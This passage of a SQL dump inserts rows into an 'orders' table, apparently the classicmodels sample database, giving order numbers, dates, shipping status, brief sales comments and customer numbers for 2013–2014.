\u0026#39;2013-05-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;114\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10121\u0026#39;, \u0026#39;2013-05-07\u0026#39;, \u0026#39;2013-05-13\u0026#39;, \u0026#39;2013-05-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;353\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;2013-05-08\u0026#39;, \u0026#39;2013-05-16\u0026#39;, \u0026#39;2013-05-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;350\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10123\u0026#39;, \u0026#39;2013-05-20\u0026#39;, \u0026#39;2013-05-29\u0026#39;, \u0026#39;2013-05-22\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;103\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;2013-05-21\u0026#39;, \u0026#39;2013-05-29\u0026#39;, \u0026#39;2013-05-25\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer very concerned about the exact color of the models. There is high risk that he may dispute the order because there is a slight color mismatch\u0026#39;, \u0026#39;112\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10125\u0026#39;, \u0026#39;2013-05-21\u0026#39;, \u0026#39;2013-05-27\u0026#39;, \u0026#39;2013-05-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;114\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;2013-05-28\u0026#39;, \u0026#39;2013-06-07\u0026#39;, \u0026#39;2013-06-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;458\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;2013-06-03\u0026#39;, \u0026#39;2013-06-09\u0026#39;, \u0026#39;2013-06-06\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested special shippment. The instructions were passed along to the warehouse\u0026#39;, \u0026#39;151\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10128\u0026#39;, \u0026#39;2013-06-06\u0026#39;, \u0026#39;2013-06-12\u0026#39;, \u0026#39;2013-06-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;2013-06-12\u0026#39;, \u0026#39;2013-06-18\u0026#39;, \u0026#39;2013-06-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;324\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10130\u0026#39;, \u0026#39;2013-06-16\u0026#39;, \u0026#39;2013-06-24\u0026#39;, \u0026#39;2013-06-21\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;198\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;2013-06-16\u0026#39;, \u0026#39;2013-06-25\u0026#39;, \u0026#39;2013-06-21\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;447\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10132\u0026#39;, \u0026#39;2013-06-25\u0026#39;, \u0026#39;2013-07-01\u0026#39;, \u0026#39;2013-06-28\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;323\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;2013-06-27\u0026#39;, \u0026#39;2013-07-04\u0026#39;, \u0026#39;2013-07-03\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;2013-07-01\u0026#39;, \u0026#39;2013-07-10\u0026#39;, \u0026#39;2013-07-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;250\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;2013-07-02\u0026#39;, \u0026#39;2013-07-12\u0026#39;, \u0026#39;2013-07-03\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10136\u0026#39;, \u0026#39;2013-07-04\u0026#39;, \u0026#39;2013-07-14\u0026#39;, \u0026#39;2013-07-06\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer is interested in buying more Ferrari models\u0026#39;, \u0026#39;242\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10137\u0026#39;, \u0026#39;2013-07-10\u0026#39;, \u0026#39;2013-07-20\u0026#39;, \u0026#39;2013-07-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;353\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;2013-07-07\u0026#39;, \u0026#39;2013-07-16\u0026#39;, \u0026#39;2013-07-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;496\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;2013-07-16\u0026#39;, \u0026#39;2013-07-23\u0026#39;, \u0026#39;2013-07-21\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;282\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;2013-07-24\u0026#39;, \u0026#39;2013-08-02\u0026#39;, \u0026#39;2013-07-30\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;161\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;2013-08-01\u0026#39;, \u0026#39;2013-08-09\u0026#39;, \u0026#39;2013-08-04\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;334\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;2013-08-08\u0026#39;, \u0026#39;2013-08-16\u0026#39;, \u0026#39;2013-08-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;2013-08-10\u0026#39;, \u0026#39;2013-08-18\u0026#39;, \u0026#39;2013-08-12\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Can we deliver the new Ford Mustang models by end-of-quarter?\u0026#39;, \u0026#39;320\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10144\u0026#39;, \u0026#39;2013-08-13\u0026#39;, \u0026#39;2013-08-21\u0026#39;, \u0026#39;2013-08-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;381\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;2013-08-25\u0026#39;, \u0026#39;2013-09-02\u0026#39;, \u0026#39;2013-08-31\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;205\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10146\u0026#39;, \u0026#39;2013-09-03\u0026#39;, \u0026#39;2013-09-13\u0026#39;, \u0026#39;2013-09-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;447\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;2013-09-05\u0026#39;, \u0026#39;2013-09-12\u0026#39;, \u0026#39;2013-09-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;379\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;2013-09-11\u0026#39;, \u0026#39;2013-09-21\u0026#39;, \u0026#39;2013-09-15\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with Finance.\u0026#39;, \u0026#39;276\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;2013-09-12\u0026#39;, \u0026#39;2013-09-18\u0026#39;, \u0026#39;2013-09-17\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;487\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;2013-09-19\u0026#39;, \u0026#39;2013-09-27\u0026#39;, \u0026#39;2013-09-21\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with Finance.\u0026#39;, \u0026#39;148\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;2013-09-21\u0026#39;, \u0026#39;2013-09-30\u0026#39;, \u0026#39;2013-09-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;311\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10152\u0026#39;, \u0026#39;2013-09-25\u0026#39;, \u0026#39;2013-10-03\u0026#39;, \u0026#39;2013-10-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;333\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;2013-09-28\u0026#39;, \u0026#39;2013-10-05\u0026#39;, \u0026#39;2013-10-03\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10154\u0026#39;, \u0026#39;2013-10-02\u0026#39;, \u0026#39;2013-10-12\u0026#39;, \u0026#39;2013-10-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;219\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;2013-10-06\u0026#39;, \u0026#39;2013-10-13\u0026#39;, \u0026#39;2013-10-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;186\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10156\u0026#39;, \u0026#39;2013-10-08\u0026#39;, \u0026#39;2013-10-17\u0026#39;, \u0026#39;2013-10-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10157\u0026#39;, \u0026#39;2013-10-09\u0026#39;, \u0026#39;2013-10-15\u0026#39;, \u0026#39;2013-10-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;473\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10158\u0026#39;, \u0026#39;2013-10-10\u0026#39;, \u0026#39;2013-10-18\u0026#39;, \u0026#39;2013-10-15\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;121\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;2013-10-10\u0026#39;, \u0026#39;2013-10-19\u0026#39;, \u0026#39;2013-10-16\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;321\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10160\u0026#39;, \u0026#39;2013-10-11\u0026#39;, \u0026#39;2013-10-17\u0026#39;, \u0026#39;2013-10-17\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;347\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;2013-10-17\u0026#39;, \u0026#39;2013-10-25\u0026#39;, \u0026#39;2013-10-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;227\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;2013-10-18\u0026#39;, \u0026#39;2013-10-26\u0026#39;, \u0026#39;2013-10-19\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;321\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10163\u0026#39;, \u0026#39;2013-10-20\u0026#39;, \u0026#39;2013-10-27\u0026#39;, \u0026#39;2013-10-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;424\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;2013-10-21\u0026#39;, \u0026#39;2013-10-30\u0026#39;, \u0026#39;2013-10-23\u0026#39;, \u0026#39;Resolved\u0026#39;, \u0026#39;This order was disputed, but resolved on 11/1/2003; Customer doesn\\\u0026#39;t like the colors and precision of the models.\u0026#39;, \u0026#39;452\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;2013-10-22\u0026#39;, \u0026#39;2013-10-31\u0026#39;, \u0026#39;2013-12-26\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;This order was on hold because customers\\\u0026#39;s credit limit had been exceeded. Order will ship when payment is received\u0026#39;, \u0026#39;148\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10166\u0026#39;, \u0026#39;2013-10-21\u0026#39;, \u0026#39;2013-10-30\u0026#39;, \u0026#39;2013-10-27\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;462\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;2013-10-23\u0026#39;, \u0026#39;2013-10-30\u0026#39;, null, \u0026#39;Cancelled\u0026#39;, \u0026#39;Customer called to cancel. The warehouse was notified in time and the order didn\\\u0026#39;t ship. They have a new VP of Sales and are shifting their sales model. Our VP of Sales should contact them.\u0026#39;, \u0026#39;448\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;2013-10-28\u0026#39;, \u0026#39;2013-11-03\u0026#39;, \u0026#39;2013-11-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;161\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;2013-11-04\u0026#39;, \u0026#39;2013-11-14\u0026#39;, \u0026#39;2013-11-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;276\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10170\u0026#39;, \u0026#39;2013-11-04\u0026#39;, \u0026#39;2013-11-12\u0026#39;, \u0026#39;2013-11-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;452\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10171\u0026#39;, \u0026#39;2013-11-05\u0026#39;, \u0026#39;2013-11-13\u0026#39;, \u0026#39;2013-11-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;233\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;2013-11-05\u0026#39;, \u0026#39;2013-11-14\u0026#39;, \u0026#39;2013-11-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;175\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;2013-11-05\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;2013-11-09\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Cautious optimism. We have happy customers here, if we can keep them well stocked. I need all the information I can get on the planned shippments of Porches\u0026#39;, \u0026#39;278\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10174\u0026#39;, \u0026#39;2013-11-06\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;2013-11-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;333\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;2013-11-06\u0026#39;, \u0026#39;2013-11-14\u0026#39;, \u0026#39;2013-11-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;324\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;2013-11-06\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;2013-11-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;386\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;2013-11-07\u0026#39;, \u0026#39;2013-11-17\u0026#39;, \u0026#39;2013-11-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;344\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;2013-11-08\u0026#39;, \u0026#39;2013-11-16\u0026#39;, \u0026#39;2013-11-10\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Custom shipping instructions sent to warehouse\u0026#39;, \u0026#39;242\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;2013-11-11\u0026#39;, \u0026#39;2013-11-17\u0026#39;, \u0026#39;2013-11-13\u0026#39;, \u0026#39;Cancelled\u0026#39;, \u0026#39;Customer cancelled due to urgent budgeting issues. Must be cautious when dealing with them in the future. Since order shipped already we must discuss who would cover the shipping charges.\u0026#39;, \u0026#39;496\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;2013-11-11\u0026#39;, \u0026#39;2013-11-19\u0026#39;, \u0026#39;2013-11-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;171\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;2013-11-12\u0026#39;, \u0026#39;2013-11-19\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;167\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;2013-11-12\u0026#39;, \u0026#39;2013-11-21\u0026#39;, \u0026#39;2013-11-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;2013-11-13\u0026#39;, \u0026#39;2013-11-22\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;We need to keep in close contact with their Marketing VP. He is the decision maker for all their purchases.\u0026#39;, \u0026#39;339\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;2013-11-14\u0026#39;, \u0026#39;2013-11-22\u0026#39;, \u0026#39;2013-11-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;484\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;2013-11-14\u0026#39;, \u0026#39;2013-11-21\u0026#39;, \u0026#39;2013-11-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;320\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;2013-11-14\u0026#39;, \u0026#39;2013-11-20\u0026#39;, \u0026#39;2013-11-18\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with the VP of Sales\u0026#39;, \u0026#39;489\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;2013-11-24\u0026#39;, \u0026#39;2013-11-16\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;211\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;2013-11-18\u0026#39;, \u0026#39;2013-11-26\u0026#39;, \u0026#39;2013-11-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;167\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10189\u0026#39;, \u0026#39;2013-11-18\u0026#39;, \u0026#39;2013-11-25\u0026#39;, \u0026#39;2013-11-24\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with Finance.\u0026#39;, \u0026#39;205\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10190\u0026#39;, \u0026#39;2013-11-19\u0026#39;, \u0026#39;2013-11-29\u0026#39;, \u0026#39;2013-11-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;2013-11-20\u0026#39;, \u0026#39;2013-11-30\u0026#39;, \u0026#39;2013-11-24\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;We must be cautions with this customer. Their VP of Sales resigned. Company may be heading down.\u0026#39;, \u0026#39;259\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;2013-11-20\u0026#39;, \u0026#39;2013-11-29\u0026#39;, \u0026#39;2013-11-25\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;363\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;2013-11-21\u0026#39;, \u0026#39;2013-11-28\u0026#39;, \u0026#39;2013-11-27\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;471\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;2013-11-25\u0026#39;, \u0026#39;2013-12-02\u0026#39;, \u0026#39;2013-11-26\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;146\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;2013-11-25\u0026#39;, \u0026#39;2013-12-01\u0026#39;, \u0026#39;2013-11-28\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;319\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;2013-11-26\u0026#39;, \u0026#39;2013-12-03\u0026#39;, \u0026#39;2013-12-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;455\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;2013-11-26\u0026#39;, \u0026#39;2013-12-02\u0026#39;, \u0026#39;2013-12-01\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer inquired about remote controlled models and gold models.\u0026#39;, \u0026#39;216\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10198\u0026#39;, \u0026#39;2013-11-27\u0026#39;, \u0026#39;2013-12-06\u0026#39;, \u0026#39;2013-12-03\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;385\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10199\u0026#39;, \u0026#39;2013-12-01\u0026#39;, \u0026#39;2013-12-10\u0026#39;, \u0026#39;2013-12-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;475\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10200\u0026#39;, \u0026#39;2013-12-01\u0026#39;, \u0026#39;2013-12-09\u0026#39;, \u0026#39;2013-12-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;211\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;2013-12-01\u0026#39;, \u0026#39;2013-12-11\u0026#39;, \u0026#39;2013-12-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;129\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;2013-12-02\u0026#39;, \u0026#39;2013-12-09\u0026#39;, \u0026#39;2013-12-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;357\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;2013-12-02\u0026#39;, \u0026#39;2013-12-11\u0026#39;, \u0026#39;2013-12-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;2013-12-02\u0026#39;, \u0026#39;2013-12-10\u0026#39;, \u0026#39;2013-12-04\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;151\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10205\u0026#39;, \u0026#39;2013-12-03\u0026#39;, \u0026#39;2013-12-09\u0026#39;, \u0026#39;2013-12-07\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39; I need all the information I can get on our competitors.\u0026#39;, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;2013-12-05\u0026#39;, \u0026#39;2013-12-13\u0026#39;, \u0026#39;2013-12-08\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Can we renegotiate this one?\u0026#39;, \u0026#39;202\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;2013-12-09\u0026#39;, \u0026#39;2013-12-17\u0026#39;, \u0026#39;2013-12-11\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Check on availability.\u0026#39;, \u0026#39;495\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;2014-01-02\u0026#39;, \u0026#39;2014-01-11\u0026#39;, \u0026#39;2014-01-04\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;146\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;2014-01-09\u0026#39;, \u0026#39;2014-01-15\u0026#39;, \u0026#39;2014-01-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;347\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10210\u0026#39;, \u0026#39;2014-01-12\u0026#39;, \u0026#39;2014-01-22\u0026#39;, \u0026#39;2014-01-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;177\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10211\u0026#39;, \u0026#39;2014-01-15\u0026#39;, \u0026#39;2014-01-25\u0026#39;, \u0026#39;2014-01-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;406\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10212\u0026#39;, \u0026#39;2014-01-16\u0026#39;, \u0026#39;2014-01-24\u0026#39;, \u0026#39;2014-01-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10213\u0026#39;, \u0026#39;2014-01-22\u0026#39;, \u0026#39;2014-01-28\u0026#39;, \u0026#39;2014-01-27\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Difficult to negotiate with customer. We need more marketing materials\u0026#39;, \u0026#39;489\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10214\u0026#39;, \u0026#39;2014-01-26\u0026#39;, \u0026#39;2014-02-04\u0026#39;, \u0026#39;2014-01-29\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;458\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10215\u0026#39;, \u0026#39;2014-01-29\u0026#39;, \u0026#39;2014-02-08\u0026#39;, \u0026#39;2014-02-01\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that FedEx Ground is used for this shipping\u0026#39;, \u0026#39;475\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10216\u0026#39;, \u0026#39;2014-02-02\u0026#39;, \u0026#39;2014-02-10\u0026#39;, \u0026#39;2014-02-04\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;256\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10217\u0026#39;, \u0026#39;2014-02-04\u0026#39;, \u0026#39;2014-02-14\u0026#39;, \u0026#39;2014-02-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;166\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10218\u0026#39;, \u0026#39;2014-02-09\u0026#39;, \u0026#39;2014-02-16\u0026#39;, \u0026#39;2014-02-11\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that ad materials (such as posters, pamphlets) be included in the shippment\u0026#39;, \u0026#39;473\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10219\u0026#39;, \u0026#39;2014-02-10\u0026#39;, \u0026#39;2014-02-17\u0026#39;, \u0026#39;2014-02-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;487\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10220\u0026#39;, \u0026#39;2014-02-12\u0026#39;, \u0026#39;2014-02-19\u0026#39;, \u0026#39;2014-02-16\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;189\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10221\u0026#39;, \u0026#39;2014-02-18\u0026#39;, \u0026#39;2014-02-26\u0026#39;, \u0026#39;2014-02-19\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;314\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10222\u0026#39;, \u0026#39;2014-02-19\u0026#39;, \u0026#39;2014-02-27\u0026#39;, \u0026#39;2014-02-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;239\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10223\u0026#39;, \u0026#39;2014-02-20\u0026#39;, \u0026#39;2014-02-28\u0026#39;, \u0026#39;2014-02-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;114\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10224\u0026#39;, \u0026#39;2014-02-21\u0026#39;, \u0026#39;2014-03-02\u0026#39;, \u0026#39;2014-02-26\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer has worked with some of our vendors in the past and is aware of their MSRP\u0026#39;, \u0026#39;171\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10225\u0026#39;, \u0026#39;2014-02-22\u0026#39;, \u0026#39;2014-03-01\u0026#39;, \u0026#39;2014-02-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;298\u0026#39;); INSERT INTO `orders` 